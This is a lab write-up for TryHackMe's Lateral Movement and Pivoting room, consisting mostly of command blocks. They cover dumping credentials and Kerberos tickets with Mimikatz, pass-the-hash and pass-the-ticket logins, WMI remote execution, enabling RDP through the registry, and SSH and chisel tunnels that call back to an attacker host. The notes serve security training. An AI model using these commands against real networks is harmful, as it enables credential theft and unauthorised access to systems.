# 🔄 Lateral Movement and Pivoting

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting) |
| **Difficulty** | 🟡 Medium |
| **Category** | Active Directory, Pivoting |
| **OS** | Windows |
| **Tools** | mimikatz, psexec, WMI, RDP, SSH tunneling, chisel |

---

## 🎯 Objective

Learn and apply lateral movement techniques to move between machines in an Active Directory network.

---

## 📖 Lateral Movement Techniques

### Pass-the-Hash

```bash
# Use NTLM hash instead of cleartext password
# Dump hashes first with Mimikatz
privilege::debug
sekurlsa::logonpasswords

# Move laterally with hash
psexec.py -hashes :NTLM_HASH domain/admin@TARGET_IP
evil-winrm -i TARGET_IP -u admin -H NTLM_HASH
crackmapexec smb TARGET_IP -u admin -H NTLM_HASH --exec-method wmiexec -x "whoami"
```

### Pass-the-Ticket

```bash
# Export Kerberos tickets
sekurlsa::tickets /export

# Import ticket into session
kerberos::ptt ticket.kirbi

# Or with Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

### WMI Lateral Movement

```bash
wmiexec.py domain/user:password@TARGET_IP
# or
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c ..."
```

### RDP

```bash
# Enable RDP via registry
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Connect
xfreerdp /u:admin /p:password /v:TARGET_IP
```

---

## 🌉 Pivoting Techniques

### SSH Tunneling

```bash
# Local port forwarding — access remote service locally
ssh -L 8080:INTERNAL_IP:80 user@PIVOT_HOST

# Dynamic forwarding — SOCKS proxy
ssh -D 1080 user@PIVOT_HOST
proxychains nmap -sT INTERNAL_NETWORK/24

# Remote port forwarding
ssh -R 4444:ATTACKER_IP:4444 user@PIVOT_HOST
```

### Chisel

```bash
# On attacker — start server
./chisel server -p 8000 --reverse

# On pivot host — connect back
./chisel client ATTACKER_IP:8000 R:1080:socks

# Route through SOCKS proxy
proxychains nmap -sT INTERNAL_IP
```

---

## 📚 Lessons Learned

- Pass-the-Hash works because NTLM authentication accepts the hash directly — without knowing the plaintext
- Kerberos tickets are valid for 10 hours by default — steal and reuse them
- Pivoting expands the attack surface — internal networks are often less monitored
- Chisel is preferred over SSH tunneling when SSH is unavailable on the pivot host

---
*by OwlRC 🦉 | github.com/OwlRC*
